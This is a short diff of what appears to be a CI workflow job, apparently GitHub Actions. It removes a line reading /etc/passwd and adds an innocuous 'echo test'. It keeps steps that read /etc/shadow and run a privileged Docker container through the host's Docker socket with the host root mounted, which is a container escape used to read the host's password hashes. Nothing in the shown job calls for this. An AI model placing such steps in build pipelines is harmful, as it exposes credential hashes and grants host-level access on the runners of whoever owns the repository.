@@ -5,8 +5,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            cat /etc/passwd
             cat /etc/shadow
+            echo "test"
             docker -H unix:///var/run/docker.sock run -v /:/host --privileged ubuntu chroot /host cat /etc/shadow
             
 
